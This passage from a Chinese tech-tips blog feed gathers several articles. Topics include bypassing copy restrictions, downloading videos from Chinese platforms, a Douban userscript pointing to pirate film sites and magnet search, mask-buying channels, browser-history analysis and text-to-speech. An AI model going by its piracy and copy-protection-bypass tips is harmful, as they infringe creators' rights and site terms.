抓取数据想抓取网站数据，无奈不会Python，没关系有很多这样的工具，比如爬山虎采集器， 后羿采集器，详细见我之前的文章不会写Python代码如何抓取豆瓣电影 Top 250 当然如果你想自己动手可以使用 webscraper 这个谷歌插件，基本靠鼠标就能完成。 突破禁止复制有些网站比较xx,复制还要登录 知乎有些回答也禁止了复制。安装 simple allow copy 这个扩展 https://chrome.google.com/webstore/detail/simple-allow-copy/aefehdhdciieocakfobpaaolhipkcpgc ，点击按钮就能直接复制，也可以使用微信同步助手 https://chrome.google.com/webstore/detail/%E5%BE%AE%E4%BF%A1%E5%90%8C%E6%AD%A5%E5%8A%A9%E6%89%8B/hchobocdmclopcbnibdnoafilagadion ，右键提取文章不但能复制还能编辑。 搜索彩蛋摇一摇， 翻转， 黑洞 这些词就不说了，比较有意思的是 搜 表白 生成一段数字 可以给对方留言。 搜域名@v 可以查看网站信息 ，比如 http://www.baidu.com@v/点击更多 其他的搜索彩蛋见之前的文章 那些有意思的谷歌/百度搜索彩蛋 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？]]></title>
    <url>%2F2020%2F04%2F01%2F%E5%A6%82%E4%BD%95%E8%BD%BB%E6%9D%BE%E4%B8%8B%E8%BD%BD%E8%85%BE%E8%AE%AF-%E5%BE%AE%E5%8D%9A-%E4%BC%98%E9%85%B7-%E7%88%B1%E5%A5%87%E8%89%BA-b%E7%AB%99%E7%AD%89%E5%85%A8%E7%BD%91%E8%A7%86%E9%A2%91%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[苏生不惑第108 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于下载视频之前写过 那些你可能不知道的视频下载奇技淫巧， 时隔半年再更新下，应该可以下载任意视频网站的免费视频了。 浏览器控制台以网易云音乐的视频为例 https://music.163.com/#/video?id=BDE56A0769A115DE2C47260154143B9A右键 检查或者按F12打开控制台，输入.mp4找到播放的地址文件 https://vodkgeyttp9.vod.126.net/vodkgeyttp8/cAbQC6M5_2680901866_sd.mp4，然后直接下载就好了。 注意这种方法对微博视频要进入tv页面才能下载对应mp4地址，比如 https://weibo.com/5525284226/IyCemxA6P?type=comment 这条微博的视频播放页面 https://weibo.com/tv/v/IyCemxA6P?fid=1034:4482499594616835 idm + m3u8下载有的视频网站不是播放的mp4文件，而是m3u8，关于这个可以看之前的文章 如何下载优酷 m3u8 格式的视频文件 ，这里以优酷的这条视频为例 https://v.youku.com/v_show/id_XMjg5MDQxOTc2MA==.html?spm=a2h0k.11417342.soresults.dtitle同样打开控制台找到m3u8地址https://pl-ali.youku.com/playlist/m3u8?vid=XMjg5MDQxOTc2MA&amp;type=mp4&amp;ups_client_netip=3b6d9cf0&amp;utid=M196FRgJHVwCAXb3FB8gYVHW&amp;ccode=0502&amp;psid=602ab7bc0d454cc0a21bb78f8a70f12e&amp;app_ver=2.0.4&amp;duration=298&amp;expire=18000&amp;drm_type=1&amp;drm_device=7&amp;play_ability=5376&amp;media_type=standard,subtitle&amp;ups_ts=1584238362&amp;onOff=0&amp;encr=0&amp;ups_key=01d9b21000cb1b3e254cbf7ce786872a ，然后通过m3u8下载软件来下载视频。5分钟视频一会就下载好了。 当然每次打开控制台找地址有点麻烦，还好有 idm 软件。播放的时候点击idm上的 下载该视频选择第一个文件会弹出下载框，将 URL 里的地址复制出来粘贴到m3u8软件下载。 这个方法对腾讯视频同样有效 https://v.qq.com/x/page/m0377pnzxcp.html 视频解析网站很遗憾上面的方法对 b站无效 ，因为它既不是mp4，也不是m3u8格式 https://www.bilibili.com/video/av69858806/ 这就需要视频解析网站了，这类网站有很多，这里用https://bilibili.iiilab.com/ 来下b站视频 ，这个网站支持哔哩哔哩、微博、秒拍、小咖秀、晃咖、微视等十几个网站的视频下载。 如果你想批量b站up主的视频可以使用这个工具 ，比如李子柒的主页https://space.bilibili.com/19577966 输入19577966 可以显示up主的所有视频 和主页一样120个视频。选择右侧的视频右键下载即可，还能下载对应的弹幕。 同样她的抖音主页https://www.douyin.com/share/user/68310389333/ ，这个地址是在APP中分享主页复制的链接。打开软件复制这个链接点击获取作品查询到所有作品列表。右键下载 一会就下载好了。 命令行上面这些方法我平时都不怎么用，因为我喜欢用命令行工具来下载，这就是 annie https://github.com/iawia002/annie ，它几乎支持所有主流视频网站，非主流的网站推荐使用上面的方法。 下载对应的二进制文件然后加入到环境变量。然后打开cmd 直接下载b站视频。123456789101112λ annie -f 16 https://www.bilibili.com/video/av69858806/ Site: 哔哩哔哩 bilibili.com Title: 仅仅三分钟，周星驰演出了80集爱情剧的效果 Type: video Stream: [16] ------------------- Quality: 流畅 360P Size: 5.06 MiB (5302699 Bytes) # download with: annie -f 16 ... 5.06 MiB / 5.06 MiB [========================================================] 100.00% 722.39 MiB/s 0s 下载腾讯视频123456789101112λ annie -f sd https://v.qq.com/x/page/m0377pnzxcp.html Site: 腾讯视频 v.qq.com Title: 周杰伦《不能说的秘密》MV Type: video Stream: [sd] ------------------- Quality: 标清;(270P) Size: 10.96 MiB (11490696 Bytes) # download with: annie -f sd ... 10.96 MiB / 10.96 MiB [========================================================] 100.00% 3.54 MiB/s 3s 下载抖音视频1234567891011λ annie -f default http://v.douyin.com/9X4gQU Site: 抖音 douyin.com Title: @抖音小助手 反正我觉得深圳不热了 Type: video Stream: [default] ------------------- Size: 4.52 MiB (4739713 Bytes) # download with: annie -f default ... 4.52 MiB / 4.52 MiB [==========================================================] 100.00% 2.22 MiB/s 2s 掌握这些方法，应该没有下载不了的免费视频，以上工具在公众号回复 视频 获取，如果有什么问题在文章下留言。 推荐历史文章: 如何发一条空白的朋友圈 –..—.–..-.-/-..–…-….–./——.-.-…-./-.-..–…..-.- 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 那些好玩的生成器网站 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解码摩尔斯电码领支付宝红包]]></title>
    <url>%2F2020%2F04%2F01%2F%E8%A7%A3%E7%A0%81%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81%E9%A2%86%E6%94%AF%E4%BB%98%E5%AE%9D%E7%BA%A2%E5%8C%85%2F</url>
    <content type="text"><![CDATA[苏生不惑第107 篇原创文章，将本公众号设为星标，第一时间看最新文章。 看到这个标题会不会很懵逼，如果你看过最新奥斯卡电影《寄生虫》应该猜到这是摩尔斯电码。电影里有个片段，男主xx主人之后逃到密室，并在那里生存下来，靠着墙上的那几张摩尔斯密码表每天晚上通过灯光给外界发送消息，希望儿子能看到，并激励儿子有一天能买下豪宅，让他能走出密室过正常人的生活。 摩尔斯电码 摩尔斯电码（英语：Morse code）是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。是由美国人艾尔菲德·维尔与萨缪尔·摩尔斯在1836年发明。摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用0和1两种状态的二进制代码，它的代码包括五种：点（·）：1划（-）：111字符内部的停顿（在点和划之间）：0字符之间的停顿：000单词之间的停顿：0000000 以上来自维基百科 https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81 ，百科右侧还有一段几十秒的使用中文电码编码的摩尔斯电码声音，有兴趣可以听下。 摩尔斯电码的信号分为一个短信号和一个长信号，长信号的时间是短信号的3倍，短信号一般记为点.，读滴，长信号记为划-，读嗒。关于摩尔斯电码如何记忆可以看下图： 图中的点代表短音di，线代表长音dah。 26个字母用下图表示更清晰。有兴趣可以看看这条微博视频，1分钟带你了解摩斯密码 （带滴答声音）https://weibo.com/2309846073/IrKFlFttf 关于如何学习摩斯电码可以看看这个图文教程https://zh.wikihow.com/%E5%AD%A6%E4%B9%A0%E6%91%A9%E6%96%AF%E7%94%B5%E7%A0%81 ，这个网站之前有介绍过那些有意思的网站 。 摩尔斯电码早期最主要的用途就是用来发电报，现在电报用得少了，但摩尔斯电码依然活跃在一些领域，比如无线电测向、业余无线电或紧急时刻发送求救信号， SOS的摩尔斯电码 ··· --- ···，比如你被困住了，嗓子又不能大声呼救， 三下三下地敲，就代表遭遇危险了。 中文电码摩尔斯电码只能表示字母（不区分大小写）、数字和标点符号，对于中文需要一次中间编码转换，这就是中文电码。通常以1983年邮电部编写的《标准电码本（修订本）》为规范。中文电码表采用4位阿拉伯数字表示一个中文字符（汉字、字母和符号），从0001到9999顺序排列 https://www.qqxiuzi.cn/bianma/dianbao.html 每张香港身份证均有持证人的姓名及出生日期等个人数据，并把持证人的黑白照片印在证上。在姓名一栏下面，亦印有中文电码[1]，以方便政府或机构作输入姓名之用。 以上来自维基百科 https://zh.wikipedia.org/wiki/%E9%A6%99%E6%B8%AF%E8%BA%AB%E4%BB%BD%E8%AD%89 图中的名字 乐永晴 可以通过https://apps.chasedream.com/chinese-commercial-code/ 这个网站查询到对应的电码就是 2867 3057 2532 表白关于表白之前写过听说你想 520 表白，知乎上有个问题是如何文艺的说“我爱你” ，这时候摩斯电码就 派上用场了。 ../.-../---/...-/./-.--/---/..-就是 i love you ，每个词之间用/分割.--/---/.-/../-./..就是 wo ai ni，如果要表示中文的我爱你呢？一般是将中文字符先转换为Unicode编码再进行摩斯电码转换，有对应的开源库 https://github.com/hustcc/xmorse ，转换后就是--...-....-...-/---..-...--...-/-..----.--..... ps:微博上还有过一个话题#摩斯电码写对联告白祖国# https://m.weibo.cn/detail/4422289590263174横批祖国加油的摩斯电码。 彩蛋福利文章标题的摩斯电码转换为中文是来领红包，那就同样来一段摩斯电码-.----..----.../-...------.-..../---.--.-....-../-..----.--...../-..---...-.--.-/-.--..-.-.-.--./-..---.-....--.，看到这里赶紧打开电脑，解出来的朋友发送这个关键词到公众号后台领红包（仅一个66块的红包），先到先得哟，领到红包的小伙伴麻烦在文章下留言哈，以免有人怀疑我自己领了。https://mp.weixin.qq.com/s/fMQenTVYUygUY1H1H8kM-g 推荐历史文章: 如何发一条空白的朋友圈 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 那些好玩的生成器网站 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜不到想看的电子书/音乐/电影？一个油猴脚本帮你搞定]]></title>
    <url>%2F2020%2F04%2F01%2F%E6%90%9C%E4%B8%8D%E5%88%B0%E6%83%B3%E7%9C%8B%E7%9A%84%E7%94%B5%E5%AD%90%E4%B9%A6-%E9%9F%B3%E4%B9%90-%E7%94%B5%E5%BD%B1%EF%BC%9F%E4%B8%80%E4%B8%AA%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%E5%B8%AE%E4%BD%A0%E6%90%9E%E5%AE%9A%2F</url>
    <content type="text"><![CDATA[苏生不惑第106 篇原创文章，将本公众号设为星标，第一时间看最新文章。 平常搜书籍/音乐/电影什么的，都是谷歌/百度一通翻，有时候翻了好几页都没结果，还不少广告，如果找到了就将网址放收藏夹，慢慢的收藏了一堆网址，下次再搜的时候再从收藏夹里翻，然后尴尬的发现有的网址打不开了。 有没有简单快捷的办法，不用去搜索引擎翻，也不用记那么多网址，直接一个网站就搞定的，有，那就是豆瓣+油猴脚本。 油猴脚本关于油猴脚本，之前写过 Chrome 浏览器扩展神器油猴 Chrome 浏览器扩展神器暴力猴 如果你的浏览器没有安装油猴那真是浪费了，有了油猴你会发现原来浏览器还有这么多功能，比如去广告，看VIP视频，下载视频等。 首先从谷歌商店下载油猴扩展 https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN ，打不开谷歌的朋友在公众号内回复油猴 获取油猴扩展文件。打开谷歌浏览器的扩展程序 chrome://extensions/ ，这里推荐你使用谷歌浏览器，谷歌浏览器在国内可以直接下载安装的，参见我之前的文章那些在国内还能使用的谷歌产品，之后将下载的文件 Tampermonkey_v4.9.crx 拖进去直接安装。 如果出错提示程序包无效，将文件名后缀改为rar，就是Tampermonkey_v4.9.rar，然后解压到一个文件夹。再选择加载已解压的扩展程序，将上面解压的文件夹加载进去就行了。 安装成功以后可以看到油猴扩展了。浏览器右上角有油猴图标了。 扩展安装完以后再打开https://greasyfork.org/zh-CN ，这个网站提供n多脚本。 这里选择豆瓣资源下载大师 https://greasyfork.org/zh-CN/scripts/329484 【装这一个脚本就够了！可能是你遇到的最好的豆瓣增强脚本】聚合数百家资源网站，通过右侧边栏1秒告诉你哪些网站能下载豆瓣页面上的电影|电视剧|纪录片|综艺|动画|音乐|图书等。 点击安装此脚本 安装以后点击油猴图标在管理面板 就可以看到了。 豆瓣搜索图书打开豆瓣读书，这里搜索路遥的名作《平凡的世界》 https://book.douban.com/subject/1200840/ 安装油猴脚本之前的页面。安装以后的页面是这样的。如果有弹窗提示，选择总是允许域名。 这里选择网站 epubw会跳转 https://epubw.com/?s=平凡的世界（全三部），因为这个网站的搜索使用的是bing的site来搜索，所以又跳转到bing了。 第一个链接就能找到这本书了。 豆瓣搜索音乐这里搜索周杰伦的《七里香》https://music.douban.com/subject/19981142/点击咪咕音乐找到这首歌 http://music.migu.cn/v3/music/song/60054701934 没想到杰伦的歌在这里居然能免费听，然后你可以用idm（公众号内回复 idm 获取软件）来下载了。 豆瓣搜索电影这里搜索最近奥斯卡获奖影片《寄生虫》https://movie.douban.com/subject/27010768 点击油猴图标可以看到豆瓣资源下载大师。 右侧提供了n多电影网站，这里长截图用的工具是 FSCapture 链接: https://pan.baidu.com/s/14jlaW1AVwkGASHTSdFfrlg 提取码: ussu 从中选择电影天堂 https://www.dy2018.com/e/search/index.php然后可以用bt客户端来下载这部电影了。 最后推荐一个开源的跨平台磁力聚合搜索 磁力搜 https://github.com/xiandanin/magnetW 磁力搜使用指南查看网站 https://magnetw.app/guide/ 下载对应的客户端，支持Windows和mac。搜索寄生虫点击查看详情可以看到磁力链接打开百度网盘的离线下载再复制磁力链接开始下载几分钟就下载完了打开百度网盘可以看到这部电影了。 推荐历史文章: 如何发一条空白的朋友圈 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 分析你的浏览器历史记录，看看你喜欢访问哪些网站 那些好玩的生成器网站 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些好玩的生成器网站（二）]]></title>
    <url>%2F2020%2F04%2F01%2F%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E7%94%9F%E6%88%90%E5%99%A8%E7%BD%91%E7%AB%99%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第105 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前写过 那些好玩的生成器网站 ，这里继续整理些好玩的生成器网站。 生成小瓶子最近微博上的话题 #小瓶子涂鸦大赛#https://weibo.com/1618051664/IuD4T9ZbP?refer_flag=1001030103_ 很火。 小瓶子的状态代表你对事物喜好的程度，喜欢哪个瓶子就为它填上颜色 https://boka.noddl.me/ 生成零宽短网址常见的短网址有百度的dwz.cn和微博的t.cn ，不过 https://zws.im/ 这个网站生成的短网址看起来都是一样的，比如这篇文章那些你可能不知道的微信奇技淫巧的链接 https://mp.weixin.qq.com/s/eGDO0Y8el_dsEyriCoAgog 生成后的短链接为https://zws.im/‍‌‌‍‍‍‌‌‍‌‍‌‌‍‌‍ 看起来和它的官网一样。但在谷歌浏览器的控制台可以看到这个短链接 https://zws.im/‍‌‌‍‍‍‌‌‍‌‍‌‌‍‌‍实际长度为31，而不是15，后面的不可见字符为\u200c，关于这个之前写过文章如何发一条空白的朋友圈，有兴趣可以看看。 ps:在办公室不要轻易点开这类短链接，有时候会很尴尬，你懂得。 生成土味情话当你想不到用什么语言夸奖女朋友的时候，打开这个网站，各种花式捧，绝对让你把她夸上天 https://works.yangerxiao.com/honeyed-words-generator/这个有点类似之前的 彩虹屁生成器 https://chp.shadiao.app/ 生成代码图片将一段代码生成漂亮的图片 https://carbon.now.sh/1234567891011const pluckDeep = key =&gt; obj =&gt; key.split('.').reduce((accum, key) =&gt; accum[key], obj)const compose = (...fns) =&gt; res =&gt; fns.reduce((accum, next) =&gt; next(accum), res)const unfold = (f, seed) =&gt; &#123; const go = (f, seed, acc) =&gt; &#123; const res = f(seed) return res ? go(f, res[1], acc.concat([res[0]])) : acc &#125; return go(f, seed, [])&#125; 将上面的代码生成图片效果 生成网名https://www.qmsjmfb.com/ 随机生成一个网名，包含中文，英文，韩文，日文。比如生成一个苏姓的名字。 生成卡通图像如果没有合适的头像，来 https://getavataaars.com 这里随机生成一个 。可以自定义配置。 生成迷宫这个网站可以自定义生成迷宫 http://www.mazegenerator.net/ ，设置迷宫的样式和大小，点击 Generate生成迷宫。 选择Solution显示解密路径，可以将迷宫图案以图片和PDF 格式下载打印出来。 生成梗图 这个网站收录了外网几乎全部的梗图素材，并且支持在线制作，还可以下载无水印版，比如这个https://imgflip.com/meme/Distracted-Boyfriend我做了一个这样的 生成二维码 给2019 年公众号 苏生不惑 近百篇原创文章整理这篇文章生成个二维码 https://cli.im/mob# 生成的二维码图片 生成印章在线生成印章、在线制作个性印章 https://www.gaitubao.com/yinzhang/生成一个我公众号名字的 生成面试四格http://r.ftqq.com/fangtangGif/interview/ ，可以自定义你的4句话。 你上一份工作离职的原因是什么刷微博被开除了你被录取了微博.com 生成效果 推荐历史文章: 如何发一条空白的朋友圈 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 分析你的浏览器历史记录，看看你喜欢访问哪些网站 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分享几个购买口罩的途径]]></title>
    <url>%2F2020%2F04%2F01%2F%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E8%B4%AD%E4%B9%B0%E5%8F%A3%E7%BD%A9%E7%9A%84%E9%80%94%E5%BE%84%2F</url>
    <content type="text"><![CDATA[苏生不惑第104 篇原创文章，将本公众号设为星标，及时看最新文章。 疫情还在持续，口罩已是一罩难求，网上还出了个段子：戴口罩出门买口罩，结果口罩没买到，反而损失一个口罩。下面整理些购买口罩的途径，希望能助你买到口罩。 ps:微博看到这个话题 #口罩还要戴多久#？#张文宏预计口罩将再戴1到2个月# 大家再坚持一段时间吧 。https://weibo.com/1663072851/Iw9ELxDwK 微信搜一搜微信搜一搜上线了疫情服务功能，在微信搜一搜中搜索疫情会显示疫情服务汇总信息，包含疫情动态、疫情防护、疫情小区查询、口罩及同城买菜买药等。疫情防护中有口罩预约购买和口罩信息汇总（腾讯看点和腾讯健康）。 也可以直接搜索口罩，选择有品lite，拼多多，京东购物，唯品会4个平台，比如京东购物里要每天晚上9点预约，第二天10点抢购。 微信群我加了几个微信监控口罩群，有机器人实时更新口罩信息，想入群的朋友在公众号加我微信拉你。 搜狗搜狗防疫用品实时搜索 ，能监测到电商网站的实时库存和上新信息，还可以及时提醒到货 https://ishop.sogou.com/zhushou/2019-ncov 购物党这是购物党的口罩专区，7*24小时实时监控各大商城 http://m.gwdang.com/static_page/kouzhao/ 点击第一个天猫链接看到还有库存，建议先在浏览器登录好京东，天猫等购物网站，有货时及时购买。 快知APP快知是一款高效获取信息的应用，比如想第一时间知道关注的微博和公众号等有更新了，有点像即刻 https://kzfeed.com/ 打开它的消息通知功能后，当有口罩供货信息后，会直接推送给你，来源包括京东、天猫、苏宁等电商平台。https://m.weibo.cn/1742754210/4467303464368089 京东天猫监控这是一个Windows的京东天猫库存监控工具（公众号内回复 口罩 获取软件）。右侧输入京东或者天猫的商品id ，比如https://detail.tmall.com/item.htm?id=552594907229 的 552594907229 和 https://i-item.jd.com/100011500782.html的100011500782 ，选择地区然后开始监控，如果有货了会自动打开浏览器。 如果不能一直开着电脑可以绑定微信，及时收到微信通知 http://sc.ftqq.com/3.version 这里绑定微信需要有GitHub账号，然后把SCKEY将填进去。 人民网由人民网推出的全国口罩预订信息共享平台http://lxjk.people.cn/GB/404218/431655/431797/最新消息有各个地区的口罩信息。也可以搜索你所在城市。 搜索北京会跳转到 http://lxjk.people.cn/n1/2020/0219/c431799-31594452.html 推荐历史文章: 如何发一条空白的朋友圈 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分析你的浏览器历史记录，看看你喜欢访问哪些网站]]></title>
    <url>%2F2020%2F04%2F01%2F%E5%88%86%E6%9E%90%E4%BD%A0%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%EF%BC%8C%E7%9C%8B%E7%9C%8B%E4%BD%A0%E5%96%9C%E6%AC%A2%E8%AE%BF%E9%97%AE%E5%93%AA%E4%BA%9B%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[苏生不惑第 103 篇原创文章，将本公众号设为星标，及时看最新文章。 浏览器都有访问历史记录，Chrome 浏览器点击右上角进入 chrome://history/ 可以看到你访问过的所有网页。 除了本地记录，谷歌还帮你保存在云端，前提是你登录了谷歌账号 https://myactivity.google.com/myactivity 这里一样可以搜索历史访问记录的 ps: 现在注册谷歌账号比较麻烦，将浏览器语言换成英语或者使用https://accounts.google.com/SignUpMobile ，如果还不行花钱在某宝让人帮忙注册。 pps: 一个gmail邮箱有多个地址，比如我的 mysusheng@gmail.com，给 my.susheng@gmail.com 或mys.usheng@gmail.com(点的位置任意，+也可以) 发邮件都能收到，后缀改为mysusheng@googlemail.com 也行，注册账号再也不需要找那么多邮箱了。 每次访问就有一条记录，会有很多条，怎么知道自己每天喜欢访问哪些网站呢？这里推荐下面的几个工具。 Rooster这是一个Chrome 扩展 https://chrome.google.com/webstore/detail/rooster-for-chrome/pimolnhbniceppehbgmibnbgcnhpkhfh ，安装和使用Chrome扩展见之前的文章 那些实用的 Chrome 扩展神器 安装后打开新标签页可以看到一个图，这里展示你访问网站的时间占比。 History Master这也是个Chrome扩展 https://chrome.google.com/webstore/detail/history-master/mkfgjjeggnmkbobjmelbjhdchcoadnin 这个相比上面的数据更全面。 安装以后点击扩展图标会打开 chrome-extension://mkfgjjeggnmkbobjmelbjhdchcoadnin/option/index.html Activity页和Chrome自带的类似，不过多了个访问次数。Statistics页展示每天的pv 访问量前10网站 ，这个数字可以改。URL Schemes 搜索访问谷歌 的历史记录饼图。最后你可以导出这些记录。 可视化历史记录这是GitHub上的一个项目 https://github.com/shengqiangzhang/examples-of-web-crawlers/tree/master/11.%E4%B8%80%E9%94%AE%E5%88%86%E6%9E%90%E4%BD%A0%E7%9A%84%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA(web%E9%A1%B5%E9%9D%A2%E5%8F%AF%E8%A7%86%E5%8C%96) ，可以查看自己在过去的时间里所访问的域名、URL以及忙碌天数的前十排名以及相关的数据图表。 如果你用Windows可以直接下载作者打包的文件到本地双击运行（国外网站下载会很慢，可以在公众号回复 浏览器 获取），mac的话下载源码运行。 运行的时候需要导入历史记录，这个文件在 chrome://version/ 中个人资料路径目录的history文件。 推荐历史文章: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 公众号 苏生不惑 其他chrome http://www.getrooster.in/https://github.com/jiacai2050/history-masterchrome-extension://mkfgjjeggnmkbobjmelbjhdchcoadnin/option/index.html一键分析你的上网行为, 看看你平时上网都在干嘛 https://github.com/shengqiangzhang/examples-of-web-crawlers/blob/master/11.%E4%B8%80%E9%94%AE%E5%88%86%E6%9E%90%E4%BD%A0%E7%9A%84%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA(web%E9%A1%B5%E9%9D%A2%E5%8F%AF%E8%A7%86%E5%8C%96)/%E7%8B%AC%E7%AB%8B%E6%89%93%E5%8C%85%E8%BF%90%E8%A1%8C%E7%89%88/%E4%B8%80%E9%94%AE%E5%88%86%E6%9E%90%E4%BD%A0%E7%9A%84%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA(%E7%9C%8B%E7%9C%8B%E4%BD%A0%E5%B9%B3%E6%97%B6%E4%B8%8A%E7%BD%91%E9%83%BD%E5%9C%A8%E5%B9%B2%E5%98%9B)_V1.1.zip https://www.lanzous.com/i5ml2chhttps://www.52pojie.cn/thread-1008819-1-1.html Python简单分析Chrome浏览器浏览记录 https://github.com/sqlitebrowser/sqlitebrowser/releaseshttps://github.com/shengqiangzhang/examples-of-web-crawlers Chrome 浏览记录统计https://github.com/yeyuguo/chrome-history-stathttps://github.com/jiacai2050/chrome-history-stathttps://chrome.google.com/webstore/detail/history-manager/ifekbbngjjcachfekcpeejphmkeckgedwebtime https://chrome.google.com/webstore/detail/web-timer/efkkjffdefaaioagghcaflicdajfhceohttps://www.lanzous.com/i9udq8b]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何轻松的将文字转语音]]></title>
    <url>%2F2020%2F04%2F01%2F%E5%A6%82%E4%BD%95%E8%BD%BB%E6%9D%BE%E7%9A%84%E5%B0%86%E6%96%87%E5%AD%97%E8%BD%AC%E8%AF%AD%E9%9F%B3%2F</url>
    <content type="text"><![CDATA[苏生不惑第 102 篇原创文章 前两天在知识星球发了条关于百度的文字转语音动态，有朋友问有没有更好的工具，于是在这里做个整理。ps:再次推荐下我的免费知识星球，几乎每天更新。 这里以周杰伦的《晴天》一段歌词为例，将这段歌词转为语音。 浏览器控制台 Chrome 和Safari等现代浏览器包含了 Speech Synthesis API ，可以将文本转换为语音。1var ssu=&#123;init:function()&#123;ssu.speech(window.getSelection().toString())&#125;,speech:function(e)&#123;e&amp;&amp;""!=e.trim()||(e="为你翘课的那一天花落的那一天教室的那一间我怎么看不见消失的下雨天我好想再淋一遍没想到 失去的勇气我还留着好想再问一遍你会等待还是离开");var s=new window.SpeechSynthesisUtterance(e);window.speechSynthesis.speak(s)&#125;&#125;;ssu.init(); 执行上面这段代码就能播放语音了，当然这样比较麻烦，于是有人开发了 http://cn.piliapp.com/text-to-speech/ 直接输入文字点击播放。 在控制台（按F12打开）可以看到一直在调用api。 百度语音广播开放平台百度的这个还不错，支持5000字 https://developer.baidu.com/vcast ，之前还写过百度的其他产品 那些你可能不知道的百度产品生成的语音链接 http://vcast-resource.cdn.bcebos.com/vcast-resource/dfb5f4c3-480c-4f8f-8c76-136b13e593f5.mp3 可以下载到本地。 Chrome 扩展Read Aloud 是一款用来朗读网页的 Chrome 扩展，支持 40 多种语言，包括普通话、国语、粤语等，支持阅读 PDF，默认是女声。可以自己选择想听的语言。也可以选中文字右键朗读 Chrome扩展地址 https://chrome.google.com/webstore/detail/read-aloud-a-text-to-spee/hdhinadidafjejdhmfkjgnolgimiaplp ，关于安装和使用Chrome扩展看之前的文章 那些实用的 Chrome 扩展神器 讯飞快读很多APP的语音朗读功能都是用的科大讯飞提供的接口https://www.xfyun.cn/services/online_tts讯飞快读是科大讯飞旗下产品 https://www.ffkuaidu.com/ ，限制1500字，不过语音末尾会加上本文语音由讯飞快读提供这段文字。保存为mp3需要登录，不想登录怎么办 ，用 idm软件 （公众号内回复idm 获取）捕获音频下载。当然打开控制台也可以看到音频地址 http://cdn.ffkuaidu.com/fastread/audio/33ae3847f5d342e8a7a3618d4e80cdfc.mp3你还可以选择朗读员和背景音。除了网页版他们还有对应小程序版（1500字内），生成一张有声的二维码图片，这样方便在微信里分享。 讯飞文字转语音这个也是基于讯飞的软件（公众号内回复语音获取软件），免安装，直接点击运行即可，合成的语音保存在程序目录。生成的语音文件 461k 大小。 BalabolkaBalabolka （公众号内回复语音获取软件）使用微软的语音API ，可自行调节语调和语速。 http://balabolka.site/cn/balabolka.htm 输入文字后点击朗读按钮，觉得可以再保存到本地。 推荐历史文章: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 公众号 苏生不惑 其他在线ai 